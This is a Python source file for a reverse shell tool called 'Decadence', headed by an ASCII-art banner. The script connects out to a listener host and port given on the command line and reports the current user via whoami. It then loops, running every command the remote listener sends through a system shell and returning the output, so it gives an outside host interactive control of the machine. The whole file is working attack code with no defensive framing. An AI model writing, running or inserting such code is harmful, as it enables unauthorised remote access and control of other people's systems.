import re
import os
import socket
import argparse
import subprocess

"""

       .        .      . ..,*,*///**,,**.*(/.....
       .     ,//*,. . .  .,,.******,*,,**.*//(*,.
     ,...  ,*/////(*,..  .....  ...,./**,,*/*/***
   ..     **///((#(###(*.. ...*(#%&%..,,,.,,**/*,
         ./,/(/(#((######%&&&&&&&&&&&,,*,*,.,****
  .      **,/((####%%%%%&&&&&&&&&&&&@@&,*/..,,,*(
         *,,//#%#%%%%%%&&&%&&&&@&&&@@@&(.(/**,,,,
   .     **,.((###%%#(#&&&&&&&&&&&&&&&, */,**,*
   .     ,**,*/((#%(/#%&&&&&&&&&&&&&&&&&/ .,*,***
   .    ..,, **,,(////%&&&&&&&&&%%&&&&&(, .././**
   .     .*.      *.(#%%&&&&&&&&(&&//#/..,*,**/
         ..          /#(%&%//,         (*  ,,,,*/
         ,      ,/(*   ,/%*.  ./#/,   .#*. ,**,,,
         .,.        ,*,*(((,       ..(..,***.**
         .,,.     **,,,,%&%%&&(*   .*(/(*,...*,/*
          ,.,/(///,*,,,,%&&&&&&%&%#%&%&, ,  .****
          . ..*/(*,,,.,*%&&&(%&&%%%%#* .. ,*,*.
           . .****...,(#%%&&%(%%&%%#%%,, ..,.,*,,
            .. ,..***,..,*##%%%&(##((%.    ,.,. ,
              ,  ***/##/#*%&&&%#(,.,(          . 
               .. ......   ......*#              
                  ...,. ...,,//*#.               
                   ,,*//(######                  
                    .,*(##%#(   
             "Introduce a little Anarchy"                                                                                                           
                  
                  - Pitticus  
    
"""


class Decadence:

    def __init__(self):

        parser = argparse.ArgumentParser(
            description="python reverse shell script")

        parser.add_argument("--host",
                            required=True,
                            type=str,
                            help="listener ip address to connect to")

        parser.add_argument("--port",
                            required=True,
                            type=int,
                            help="listener port to connect to"
                            )

        self.args = parser.parse_args()

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.connect()

    def connect(self):

        try:
            self.s.connect((self.args.host, self.args.port))
            p = subprocess.Popen("whoami",
                                 shell=True,
                                 stdin=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 stdout=subprocess.PIPE)
            self.s.send((f"\nconnected!\n\nuser account:\n".encode()))
            self.s.send(p.communicate()[0])

        except ConnectionError:
            print("connection failed.")
            exit()

        while True:

            self.s.send("\ndecadence> ".encode())
            command = self.s.recv(4048)
            command = command.decode("utf-8")

            if re.search("^cd\s+", command):
                directory = command[3:].rstrip()

                if not directory:
                    continue

                try:
                    os.chdir(rf"{directory}")

                except FileNotFoundError:
                    self.s.send("Directory was not found.\n\n".encode())

            elif command.rstrip() == "exit":
                exit()

            elif command.rstrip() == "help":
                helpmenu = """
        built-in support
--------------------------------
cd - change directory
exit - closes the connection 
        """
                self.s.send(helpmenu.encode())

            else:
                p = subprocess.Popen(command,
                                     shell=True,
                                     stdin=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     stdout=subprocess.PIPE)

                # return stdout
                if p.communicate()[0]:
                    self.s.send(p.communicate()[0])

                # return stderr
                elif p.communicate()[1]:
                    self.s.send(p.communicate()[1])

if __name__ == "__main__":
    revshell = Decadence()
